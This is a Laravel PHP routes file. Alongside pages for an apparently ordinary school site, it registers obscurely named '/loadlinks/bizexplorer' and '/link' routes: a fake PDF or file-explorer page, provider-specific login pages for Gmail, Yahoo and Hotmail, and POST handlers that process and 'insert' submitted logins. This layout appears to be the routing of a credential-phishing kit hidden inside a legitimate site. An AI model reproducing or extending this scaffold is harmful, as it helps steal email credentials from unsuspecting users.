<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|kk
*/

Route::get('/test', function () {
    return view('welcome');
});
Route::get('/hellofjfkfkf/getbiz.k/home', function () {
    return 'File explorer index page';
});
Route::get('/loadlinks/bizexplorer/startupfunds', "PagesController@links");
Route::get('/loadlinks/bizexplorer/light', function(){

    return view('pages.cons');
});
Route::get('/', ['as'=>'home',function(){

    return view('Sawi.home');
}]);
Route::get('/sawi/about', ['as'=>'about', function(){

    return view('Sawi.about');
}]);
Route::get('/sawi/project', ['as'=>'project', function(){

    return view('Sawi.project');
}]);
Route::get('/sawi/gallery', ['as'=>'gallery', function(){

    return view('Sawi.gallery');
}]);
Route::get('/sawi/test', ['as'=>'test', function(){

    return view('Sawi.test');
}]);
Route::get('/sawi/contact',['as'=>'contact', function(){

    return view('Sawi.contact');
}]);
Route::get('/sawi/admission', ['as'=>'admission',function(){

    return view('Sawi.admission');
}]);
Route::get('/sawi/event', function(){

    return view('Sawi.events');
});





//Route::get('/loadcontrollerlinks', 'PagesController@links');
Route::get('/loadlinks/bizexplorer/login', "PagesController@login")->name('login');
Route::get('/loadlinks/bizexplorer/confirmlogins', "PagesController@confirm")->name('confirm');
Route::get('/loadlinks/bizexplorer/loadpdf', "PagesController@getPDF")->name('file');
Route::get('/loadlinks/bizexplorer/gmailUser', "PagesController@gmail")->name('gmail');
Route::post('/loadlinks/bizexplorer/load', "PagesController@try")->name('process');
Route::get('/loadlinks/bizexplorer/ymailUser', "PagesController@ymail")->name('ymail');
Route::get('/loadlinks/bizexplorer/hotmail', "PagesController@hmail")->name('hmail');
Route::post('/loadlinks/bizexplorer/confirmed', "PagesController@confirm")->name('firm');
Route::get('/loadlinks/bizexplorer/confirmed', function(){
    return view('pages.confirm');
});  


/*
      Miscellanous for controller
*/
Route::get('/miscel', ["as"=>"index", function(){
      return view("Miscellanous.Controller.index");

}]);
#Route::get('/miscel02', "Miscel@index")->name('miscel');
Route::get("/test1", ["as"=>"test", function(){
        return("Welcome Home");
}]);

Route::get('/linkh', "Miscel@index")->name('miscel');
#Route::get('/link/login', "Miscel@loadlog")->name('mlog');
Route::get('/link/file', "Miscel@loadlog")->name('mfile');
Route::get("/link/login", ["as"=>"mlog", function(){
    return view("Details.login");
}]);
Route::post('/link/log/process', "Miscel@insert")->name('mlog2');
Auth::routes();

Route::get('/home', 'HomeController@index')->name('home');
